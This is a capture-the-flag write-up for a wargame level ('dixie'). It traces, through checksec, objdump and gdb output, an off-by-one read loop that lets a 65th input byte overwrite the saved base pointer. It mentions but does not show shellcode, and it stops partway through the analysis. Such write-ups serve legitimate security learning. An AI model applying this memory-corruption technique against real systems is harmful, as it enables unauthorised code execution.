## Infos on the binary

```shell
level02@rainfall:~$ checksec dixie
[*] '/home/level02/dixie'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same protections as previous level.

```shell
level02@rainfall:~$ objdump -R dixie

dixie:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403fd8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403fe0 R_X86_64_GLOB_DAT  __gmon_start__@Base
0000000000404040 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404008 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404010 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  memcpy@GLIBC_2.14
0000000000404028 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
```

No sign of an unprotected function like gets() or read() with a smaller buffer.

There is this condition in the store_record() function:

```shell
while (in_len <= BUF_SIZE) {
    in_ch = read(0, &buf[in_len], 1); # 0x401448
```

It reads one byte at a time until the buffer is full, but it does that for len <= BUF_SIZE (64 bytes), so we can do 65 iterations and overflow.

```shell
[FLATLINE] Ready: AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaA # 65 bytes
[FLATLINE] Record 0 stored. Checksum: 57acb1fd
[FLATLINE] Record 0: AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa (checksum: 5a700f25)
  [FLATLINE] ���� session closed.
Segmentation fault (core dumped)
```


launch env -i gdb + shellcode as an env var
Then `unset environment LINES` and `unset environment COLUMNS`. 


```shell
(gdb) disas store_record
Dump of assembler code for function store_record:
   0x00000000004013d2 <+0>:	endbr64
   0x00000000004013d6 <+4>:	push   %rbp
   0x00000000004013d7 <+5>:	mov    %rsp,%rbp
...
   0x0000000000401434 <+98>:	lea    -0x40(%rbp),%rdx
   0x0000000000401438 <+102>:	add    %rdx,%rax
   0x000000000040143b <+105>:	mov    $0x1,%edx
   0x0000000000401440 <+110>:	mov    %rax,%rsi
   0x0000000000401443 <+113>:	mov    $0x0,%edi
   0x0000000000401448 <+118>:	call   0x4010c0 <read@plt>
...
   0x000000000040149c <+202>:	call   0x4012c7 <commit_record>
   0x00000000004014a1 <+207>:	leave
   0x00000000004014a2 <+208>:	ret
```

```shell
(gdb) b store_record
Breakpoint 1 at 0x4013da
(gdb) p/x $rbp
$2 = 0x7fffffffecc0
(gdb) x/gx $rbp # Value of the base pointer of main
0x7fffffffecc0:	0x00007fffffffece0
(gdb) x/gx $rbp+8 # Value of the return address of main
0x7fffffffecc8:	0x0000000000401575
(gdb) p/x $rbp-0x40 # Buffer address
$3 = 0x7fffffffec80
```

```shell
(gdb) b*0x4014a1               
Breakpoint 1 at 0x4014a1 # leave instruction of store_record
(gdb) r < /tmp/65
Starting program: /home/level02/dixie < /tmp/65
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
Breakpoint 1, 0x00000000004014a1 in store_record ()
(gdb) x/11gx $rbp-0x40
0x7fffffffec80:	0x4141414141414141	0x4141414141414141
0x7fffffffec90:	0x4141414141414141	0x4141414141414141
0x7fffffffeca0:	0x4141414141414141	0x4141414141414141
0x7fffffffecb0:	0x4141414141414141	0x4141414141414141 # the 64 A + 42 on following line is the 65th byte
0x7fffffffecc0:	0x00007fffffffec42	0x0000000000401575 <- # return address of main, as we saw before
0x7fffffffecd0:	0x0000006569786964
```

```shell
(gdb) x/2i $pc # shows next 2 instructions
=> 0x4014a1 <store_record+207>:	leave
   0x4014a2 <store_record+208>:	ret
(gdb) ni # execute next instruction
0x00000000004014a2 in store_record ()
(gdb) p/x $rbp
$2 = 0x7fffffffec42 # the 65th byte we wrote overwrote the base pointer of main
(gdb) ni # Next instruction return to main
0x0000000000401575 in main ()
```

```shell
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401543 <+0>:	endbr64
   0x0000000000401547 <+4>:	push   %rbp
   ...
   0x0000000000401595 <+82>:	mov    $0x0,%eax
   0x000000000040159a <+87>:	leave
   0x000000000040159b <+88>:	ret
   End of assembler dump.

(gdb) b *0x40159a # Breakpoint at the leave instruction of main
Breakpoint 2 at 0x40159a
(gdb) c
Continuing.
[FLATLINE] Record 0: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (checksum: 5a655a65)
  [FLATLINE]  session closed.

Breakpoint 2, 0x000000000040159a in main ()
(gdb) p/x $rbp
$3 = 0x7fffffffec42 # Still overwritten rbp
(gdb) x/gx $rbp+8 # Value of the return address of main
0x7fffffffec4a:	0x0040000000000040
(gdb) p/x ($rbp+8) - 0x7fffffffec80 # b
$5 = 0xffffffffffffffca # = -54
```